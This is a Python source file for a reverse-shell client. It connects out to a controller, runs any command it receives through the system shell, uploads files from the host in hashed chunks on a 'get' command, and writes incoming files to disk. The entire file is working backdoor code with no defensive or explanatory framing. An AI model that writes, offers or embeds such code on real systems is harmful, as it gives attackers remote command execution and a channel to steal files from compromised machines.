import socket
import subprocess
import os
import ast
import hashlib
import time

ip = '127.0.0.1'
port = 1234
RECV_SIZE = 1024 * 1024  # 1MB
CHUNK_SIZE = 1024 * 1020  

# Create a TCP/IP socket
cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # Connect to the server
    cs.connect((ip, port))
    print(f"Connected to server at {ip}:{port}")

    while True:
        # Receive the command from the server
        print("Waiting to receive command...")
        command = cs.recv(RECV_SIZE).decode('utf-8')
        print(f"Received command: {command}")

        try:
            command = ast.literal_eval(command)  # Safely parse the string into a dictionary
            print(f"Parsed command: {command}")
        except (SyntaxError, ValueError) as e:
            print(f"Received invalid command format: {e}")
            continue

        if isinstance(command, dict):
            if command.get("type") == "file":
                file_name = command.get("name")
                file_data = command.get("data").encode('latin1')
                chunk_number = command.get("chunk_number")
                total_chunks = command.get("total_chunks")
                chunk_hash = command.get("chunk_hash")
                output = command.get("output")

                print(f"Handling file chunk {chunk_number}/{total_chunks} for file: {file_name}")
                received_chunk_hash = hashlib.sha256(file_data).hexdigest()
                if received_chunk_hash != chunk_hash:
                    output = f"Chunk {chunk_number} hash mismatch. Expected {chunk_hash}, got {received_chunk_hash}"
                    print(output)
                else:
                    try:
                        with open(file_name, 'ab') as file:
                            file.write(file_data)
                        output = f"Chunk {chunk_number}/{total_chunks} of {file_name} saved successfully."
                        print(output)

                        if chunk_number == total_chunks:
                            # All chunks received, verify file hash
                            print("All chunks received, verifying file hash...")
                            with open(file_name, 'rb') as file:
                                file_hash = hashlib.sha256(file.read()).hexdigest()
                            if file_hash == command.get("file_hash"):
                                output = f"File {file_name} received successfully with correct hash."
                                print(output)
                            else:
                                output = f"File {file_name} hash mismatch. Expected {command.get('file_hash')}, got {file_hash}"
                                print(output)
                    except Exception as e:
                        output = f"Error saving chunk {chunk_number} of {file_name}: {str(e)}"
                        print(output)

                out_dict = {"type": "output", "output": output}
                cs.send(str(out_dict).encode('utf-8'))
                print(f"Sent response: {out_dict}")

            elif command.get("type") == "cmd":
                cmd = command.get("cmd")
                print(f"Handling command: {cmd}")
                if cmd.lower() == 'quit':
                    print("Received quit command. Exiting...")
                    break

                elif cmd.startswith('get '):
                    try:
                        file_path = cmd[4:].strip()
                        file_path = os.path.expanduser(file_path)
                        print(f"Reading file: {file_path}")

                        with open(file_path, 'rb') as file:
                            file_data = file.read()
                            file_hash = hashlib.sha256(file_data).hexdigest()
                            total_chunks = (len(file_data) + CHUNK_SIZE - 1) // CHUNK_SIZE
                            for chunk_number in range(total_chunks):
                                chunk = file_data[chunk_number * CHUNK_SIZE: (chunk_number + 1) * CHUNK_SIZE]
                                chunk_hash = hashlib.sha256(chunk).hexdigest()
                                out_dict = {
                                    "type": "file_chunk",
                                    "name": os.path.basename(file_path),
                                    "data": chunk.decode('latin1'),
                                    "chunk_number": chunk_number + 1,
                                    "total_chunks": total_chunks,
                                    "chunk_hash": chunk_hash,
                                    "file_hash": file_hash
                                }
                                cs.send(str(out_dict).encode('utf-8'))
                                print(f"Sent chunk {chunk_number + 1}/{total_chunks} of {file_path}")
                                time.sleep(1)  # Ensure chunks are sent separately
                        output = f"Successfully read file: {file_path}"
                        print(output)
                    except Exception as e:
                        output = f"Error reading file: {str(e)}"
                        print(output)
                        out_dict = {
                            "type": "output",
                            "output": output
                        }
                        cs.send(str(out_dict).encode('utf-8'))

                else:
                    try:
                        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                        stdout, stderr = process.communicate()
                        output = stdout + stderr
                        print(f"Command output: {output}")
                    except Exception as e:
                        output = str(e)
                        print(f"Error executing command: {output}")

                    out_dict = {"type": "output", "output": output}
                    cs.send(str(out_dict).encode('utf-8'))
                    print("Sent output:", output)

except ConnectionError as e:
    print(f"Connection error: {e}")
finally:
    cs.close()
    print("Connection closed")
